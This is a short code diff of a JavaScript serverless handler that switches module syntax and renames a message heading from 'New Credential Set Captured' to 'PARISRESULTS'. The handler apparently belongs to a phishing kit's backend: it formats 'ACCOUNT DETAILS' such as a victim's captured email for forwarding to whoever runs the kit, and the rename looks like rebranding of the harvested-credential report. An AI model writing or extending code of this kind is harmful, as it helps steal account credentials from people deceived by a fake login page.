@@ -1,6 +1,6 @@
-import UAParser from 'ua-parser-js';
+const UAParser = require('ua-parser-js');
 
-export const handler = async (event, context) => {
+exports.handler = async (event, context) => {
   // CORS headers
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -120,7 +120,7 @@ export const handler = async (event, context) => {
     }) + ' UTC';
 
     const message = `
-*🔐 New Credential Set Captured 🔐*
+*🔐 PARISRESULTS 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: \`${email || 'Not captured'}\`
